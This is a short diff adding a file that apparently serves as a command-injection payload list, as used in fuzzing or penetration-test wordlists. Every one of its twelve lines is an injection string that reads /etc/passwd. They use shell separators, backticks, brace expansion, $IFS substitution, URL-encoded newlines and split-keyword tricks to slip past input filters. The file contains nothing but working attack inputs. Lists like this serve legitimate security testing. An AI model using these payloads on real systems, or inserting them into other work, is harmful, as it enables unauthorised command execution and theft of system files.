@@ -1,0 +1,12 @@
+$ {cat,/etc/passwd}
+cat</etc/passwd
+; cat /etc/passwd
+&& cat /etc/passwd
+qsdqsdqsd|| cat /etc/passwd
+| cat /etc/passwd
+ `cat /etc/passwd`
+ $cat(/etc/passwd)
+ cat$IFS/etc/passwd
+ echo${IFS}"RCE"${IFS}&&cat${IFS}/etc/passwd
+127.0.0.1%0Acat%20/etc/passwd
+; c$@at /etc/passwd
